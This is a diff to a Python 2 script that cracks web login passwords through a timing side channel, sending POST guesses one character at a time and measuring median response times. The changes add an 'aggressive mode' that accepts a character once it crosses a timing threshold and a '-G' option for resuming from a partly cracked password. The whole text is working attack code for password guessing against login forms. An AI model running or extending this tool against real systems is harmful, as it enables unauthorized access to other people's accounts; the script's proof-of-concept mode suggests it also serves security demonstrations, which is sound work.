@@ -58,6 +58,13 @@ def makerequest(guess):
                     totaltime += i
                 print "Total time to make " + str(NUMREQUESTS) + " requests for '" + c + "' was " + str(totaltime) + " seconds."
 
+        # if user wants to be aggressive, check against their threshold for every character
+        if VALIDTHRESHOLD:
+            chartimemedian = getmedian(chartimes)
+            if chartimemedian[c] >= VALIDTHRESHOLD:
+                print "Aggressive mode being used. Character took longer than threshold, assuming it's legit. Skipping other chars."
+                break
+
     # get avg of chartimes
     #chartimemedian = getaverage(chartimes)
     chartimemedian = getmedian(chartimes)
@@ -139,6 +146,8 @@ if __name__ == '__main__':
     parser.add_argument('-c', help='The character set to use for guessing', dest="charset", default="abcde")
     parser.add_argument('-U', help="username POST parameter variable name", dest="postusername", default="username")
     parser.add_argument('-P', help="password POST parameter variable name", dest="postpassword", default="password")
+    parser.add_argument('-G', help="A guess for the start of the password. Useful if you've cracked part of a password and don't want to reattempt those characters again.", dest="guesspassword", default="")
+    parser.add_argument('-A', help="Aggressive mode, which will assume a character is correct if it takes longer than a certain threshold average.", dest="threshold", default=False)
     parser.add_argument('--poc-password', help="The known password. This is to run the application in proof-of-concept mode to count the number of failed attempts before a succesful timing attack is performed", dest="poc", default=False)
     
     args = parser.parse_args()
@@ -164,6 +173,13 @@ if __name__ == '__main__':
     USERNAMEPOSTPARAM = args.postusername
     PASSWORDPOSTPARAM = args.postpassword
 
+    # setup threshold var. if not defined, value set to false
+    if args.threshold:
+        VALIDTHRESHOLD = float(args.threshold)
+    else:
+        VALIDTHRESHOLD = False
+
     print "KNOWNPASSWORD type is " + str(type(KNOWNPASSWORD))
 
-    main()
+    # give the guesspassword arg. if user didn't specify, an empty string will be passed
+    main(args.guesspassword)
